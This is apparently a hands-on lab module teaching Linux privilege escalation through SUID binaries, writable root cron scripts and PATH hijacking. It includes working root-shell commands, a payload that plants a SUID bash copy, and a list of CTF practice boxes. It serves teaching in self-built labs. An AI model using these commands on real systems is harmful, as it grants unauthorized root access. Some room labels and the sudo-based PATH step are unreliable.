# 04 — Privilege Escalation: Labs

> 📋 **What You Will Do In This Section**
> - [ ] Set up and exploit SUID binaries in a controlled lab
> - [ ] Exploit writable cron job scripts to get root
> - [ ] Perform PATH hijacking to intercept root commands
> - [ ] Practice on recommended CTF platforms (TryHackMe, HackTheBox)

---

## 🧪 Lab 1: SUID Exploitation

### Objective
Create a vulnerable SUID binary and exploit it to escalate privileges.

> 💡 **Why This Matters**
> SUID exploitation is the second most common privesc vector (after sudo). On HackTheBox and real engagements, you'll find unusual SUID binaries that aren't doing proper privilege dropping. This lab teaches you the muscle memory of: find → check GTFOBins → exploit.

### Setup
```bash
# Create practice SUID binaries (requires sudo)
sudo cp /usr/bin/find /usr/local/bin/find-suid
sudo chmod u+s /usr/local/bin/find-suid

sudo cp /usr/bin/vim /usr/local/bin/vim-suid
sudo chmod u+s /usr/local/bin/vim-suid
```

### Exercise

**Step 1: Discovery**
```bash
find / -perm -4000 -type f 2>/dev/null | grep -v snap
```

> ✅ **Expected Output**
> ```
> /usr/local/bin/find-suid
> /usr/local/bin/vim-suid
> /usr/bin/passwd
> /usr/bin/sudo
> ... (standard system SUID binaries)
> ```
> The non-standard ones (`find-suid`, `vim-suid`) are your targets!

**Step 2: Exploit find**
```bash
/usr/local/bin/find-suid . -exec /bin/sh -p \; -quit
whoami
id
```

> ✅ **Expected Output**
> ```
> # whoami
> root
> # id
> uid=1000(user) gid=1000(user) euid=0(root) groups=...
> ```
> Note: `euid=0(root)` — effective UID is root!

**Step 3: Exploit vim**
```bash
/usr/local/bin/vim-suid -c ':!/bin/sh -p'
```

> ✅ **Expected Output**
> A root shell opens inside vim. Type `whoami` to confirm root.

> 🔧 **If Stuck**
> - Shell doesn't show as root → Use `-p` flag to preserve SUID privileges
> - vim opens but no shell → Type `:!/bin/sh -p` inside vim (colon first)
> - Clean up: `sudo rm /usr/local/bin/find-suid /usr/local/bin/vim-suid`

### ✅ Success Criteria
- [ ] Found both SUID binaries through scanning
- [ ] Obtained root via find SUID exploitation
- [ ] Obtained root via vim SUID exploitation
- [ ] Checked GTFOBins for both binaries

---

## 🧪 Lab 2: Cron Job Exploitation

### Objective
Exploit a writable script executed by a root cron job.

> 💡 **Why This Matters**
> Sysadmins write backup scripts, log rotation scripts, and cleanup scripts — and schedule them via cron. If ANY of these scripts are writable by your user, you can inject commands that root will execute on the next tick.

### Setup
```bash
# Create a vulnerable cron job (requires sudo)
sudo bash -c 'cat > /opt/backup.sh << "EOF"
#!/bin/bash
tar czf /tmp/backup.tar.gz /home/
echo "Backup completed at $(date)" >> /tmp/backup.log
EOF'
sudo chmod 777 /opt/backup.sh
echo "* * * * * root /opt/backup.sh" | sudo tee -a /etc/crontab
```

### Exercise

**Step 1: Discover the cron job**
```bash
echo "=== System Cron ==="
cat /etc/crontab | grep -v "^#" | grep -v "^$"

echo ""
echo "=== Script Permissions ==="
ls -la /opt/backup.sh
```

> ✅ **Expected Output**
> ```
> * * * * * root /opt/backup.sh
>
> -rwxrwxrwx 1 root root ... /opt/backup.sh
> ```
> The script runs as root every minute AND is world-writable!

**Step 2: Inject payload**
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
echo "[*] Payload injected. Waiting for cron (up to 60 seconds)..."
```

**Step 3: Wait and exploit**
```bash
# Wait up to 60 seconds for cron to run
sleep 65
ls -la /tmp/rootbash

# Get root
/tmp/rootbash -p
whoami
```

> ✅ **Expected Output**
> ```
> -rwsr-sr-x 1 root root ... /tmp/rootbash
> # whoami
> root
> ```

> 🔧 **If Stuck**
> - `/tmp/rootbash` doesn't appear → Cron might not have run yet. Check: `cat /tmp/backup.log`
> - Still no luck → Verify cron is running: `systemctl status cron`
> - Clean up: `sudo rm /tmp/rootbash; sudo sed -i '/backup.sh/d' /etc/crontab; sudo rm /opt/backup.sh`

### ✅ Success Criteria
- [ ] Discovered the cron job and its schedule
- [ ] Confirmed the script is writable
- [ ] Injected a SUID payload
- [ ] Obtained root after cron execution

---

## 🧪 Lab 3: PATH Hijacking

### Objective
Hijack a command in a root-executed script by manipulating PATH.

> 💡 **Why This Matters**
> When scripts use `ps` instead of `/usr/bin/ps`, the system looks in PATH for the binary. If you can prepend a directory you control to PATH, your malicious binary runs instead. This is common in custom scripts and CTF challenges.

### Setup
```bash
sudo bash -c 'cat > /opt/monitor.sh << "EOF"
#!/bin/bash
ps aux > /tmp/processes.log
echo "Monitor ran at $(date)" >> /tmp/monitor.log
EOF'
sudo chmod +x /opt/monitor.sh
sudo chmod 777 /opt/monitor.sh
```

### Exercise

```bash
# Step 1: Analyze the script
cat /opt/monitor.sh
# Notice: "ps" is called without full path (/usr/bin/ps)

# Step 2: Create malicious "ps"
cat > /tmp/ps << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
# Also run real ps so the script doesn't look broken
/usr/bin/ps "$@"
EOF
chmod +x /tmp/ps

# Step 3: Hijack PATH
export PATH=/tmp:$PATH

# Step 4: Run the script (simulating root cron execution)
# In a real scenario, root's cron would run this
sudo /opt/monitor.sh

# Step 5: Get root
/tmp/rootbash -p
whoami
```

> ✅ **Expected Output**
> ```
> # whoami
> root
> ```

> 🔧 **If Stuck**
> - PATH doesn't persist → In a real scenario, you'd modify `.bashrc` or the script itself
> - Clean up: `rm /tmp/ps /tmp/rootbash`

### ✅ Success Criteria
- [ ] Identified relative command usage in the script
- [ ] Created a malicious binary with the same name
- [ ] Prepended your directory to PATH
- [ ] Obtained root through PATH hijacking

---

## 🧪 Lab 4: HackTheBox / TryHackMe Practice

### Recommended Boxes

> 💡 **Why This Matters**
> The labs above teach individual techniques. Real boxes combine multiple vectors — you might need to find credentials, use them to SSH in, discover a SUID binary, exploit it, then pivot. These platforms give you realistic practice.

```
TryHackMe (Beginner-Friendly):
├── Linux PrivEsc: https://tryhackme.com/room/linprivesc
├── Linux PrivEsc Arena: https://tryhackme.com/room/introtoshells
└── Sudo Buffer Overflow: https://tryhackme.com/room/dvwa

HackTheBox (Intermediate):
├── Lame (Easy) — SUID exploitation
├── Bashed (Easy) — Cron job exploitation
├── Beep (Easy) — Multiple privesc paths
└── Shocker (Easy) — Shellshock + sudo
```

### How To Approach Each Box

```
1. Get initial shell (web exploit, SSH, etc.)
2. Run: whoami && id && sudo -l
3. Run: find / -perm -4000 -type f 2>/dev/null
4. Transfer and run LinPEAS
5. Check every red/yellow line
6. Exploit the vector you found
7. Document the full chain
```

### ✅ Success Criteria
- [ ] Completed at least one TryHackMe privesc room
- [ ] Got root on at least one HackTheBox machine
- [ ] Documented the escalation path

---

## 📋 Lab Completion Checklist

- [ ] Lab 1: SUID exploitation (find + vim)
- [ ] Lab 2: Cron job injection → root
- [ ] Lab 3: PATH hijacking → root
- [ ] Lab 4: At least one CTF platform box completed

---

## 🧠 If You're Stuck

1. **SUID binary not giving root**: Make sure you're using the correct syntax from GTFOBins. Not all SUID binaries are exploitable — only ones that allow command execution.
2. **Cron not running**: Check `systemctl status cron` and verify the cron syntax is correct. Use `pspy` to monitor for hidden cron jobs.
3. **PATH hijacking doesn't work**: The script must use a relative command (e.g., `ps` not `/usr/bin/ps`). Check with `cat` or `strings` on the script.
4. **LinPEAS output overwhelming**: Focus only on RED and YELLOW lines. Those are the highest-probability vectors.
